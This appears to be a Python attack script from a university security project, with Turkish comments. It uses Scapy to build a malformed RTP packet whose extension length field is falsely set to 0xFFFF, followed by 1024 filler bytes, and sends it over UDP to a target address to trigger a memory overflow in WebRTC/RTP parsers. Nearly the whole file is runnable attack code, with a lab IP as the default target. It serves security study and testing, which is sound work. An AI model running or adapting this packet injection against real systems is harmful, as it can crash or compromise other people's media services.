# -*- coding: utf-8 -*-
# NetForge-RTC: WebRTC Packet Manipulation Framework
# Istinye University - Bilişim Güvenliği Teknolojisi Final Project

import sys
import socket
from scapy.all import IP, UDP, Raw, send

def generate_malformed_rtp(target_ip, target_port):
    print(f"[*] Hedef IP: {target_ip}:{target_port} için paketler oluşturuluyor...")
    
    # Standart RTP Başlığı (V=2, P=0, X=1, CC=0, M=1, PT=96)
    # Extension biti aktif edilerek sahte uzunluk verilecek
    rtp_header = b'\x90\x60\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00'
    
    # Tehdit Modeli: Uzunluk değerini (Extension Length) aşırı büyük göstererek bellek taşması tetikleme simülasyonu
    # 0xFFFF değeri sistemin çok büyük bir extension alanı okumasını bekletir
    malformed_extension = b'\xBE\xDE\xFF\xFF' 
    
    # Taşma oluşturacak yapay payload
    payload = b"A" * 1024
    
    packet_data = rtp_header + malformed_extension + payload
    
    # Scapy ile IP ve UDP Katmanlarının İnşası
    pkt = IP(dst=target_ip)/UDP(sport=5004, dport=target_port)/Raw(load=packet_data)
    
    try:
        send(pkt, verbose=True)
        print("[+] Manipüle edilmiş RTP paketi başarıyla enjekte edildi.")
    except Exception as e:
        print(f"[-] Paket gönderim hatası: {str(e)}")

if __name__ == "__main__":
    # Örnek test parametreleri (Lab ortamı local IP adresleri için)
    test_target = "192.168.1.50"
    test_port = 16384
    generate_malformed_rtp(test_target, test_port)
